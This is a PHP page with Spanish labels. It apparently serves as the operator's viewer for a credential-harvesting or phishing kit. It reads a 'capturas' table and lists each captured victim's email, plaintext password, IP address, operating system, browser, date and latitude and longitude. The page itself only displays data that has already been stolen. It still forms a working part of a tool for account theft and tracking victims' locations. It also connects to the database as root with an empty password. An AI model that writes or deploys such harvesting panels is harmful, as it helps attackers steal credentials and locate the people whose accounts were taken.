<?php
// Conexión a la base de datos
$conexion = new mysqli("localhost", "root", "", "datos");

if ($conexion->connect_error) {
    die("Conexión fallida: " . $conexion->connect_error);
}

$resultado = $conexion->query("SELECT * FROM capturas ORDER BY id DESC");
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Datos capturados</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #888;
            text-align: left;
        }
        th {
            background-color: #333;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        body {
            font-family: Arial, sans-serif;
            padding: 40px;
        }
        h2 {
            color: #333;
        }
    </style>
</head>
<body>
    <h2>Registros capturados</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Correo</th>
                <th>Contraseña</th>
                <th>IP</th>
                <th>Sistema Operativo</th>
                <th>Navegador</th>
                <th>Fecha</th>
                <th>Latitud</th>
                <th>Longitud</th>
            </tr>
        </thead>
        <tbody>
            <?php while ($fila = $resultado->fetch_assoc()): ?>
                <tr>
                    <td><?= htmlspecialchars($fila['id']) ?></td>
                    <td><?= htmlspecialchars($fila['correo']) ?></td>
                    <td><?= htmlspecialchars($fila['contrasena']) ?></td>
                    <td><?= htmlspecialchars($fila['ip']) ?></td>
                    <td><?= htmlspecialchars($fila['so']) ?></td>
                    <td><?= htmlspecialchars($fila['navegador']) ?></td>
                    <td><?= htmlspecialchars($fila['fecha']) ?></td>
                    <td><?= htmlspecialchars($fila['latitud']) ?></td>
                    <td><?= htmlspecialchars($fila['longitud']) ?></td>
                </tr>
            <?php endwhile; ?>
        </tbody>
    </table>
</body>
</html>

<?php
$conexion->close();
?>
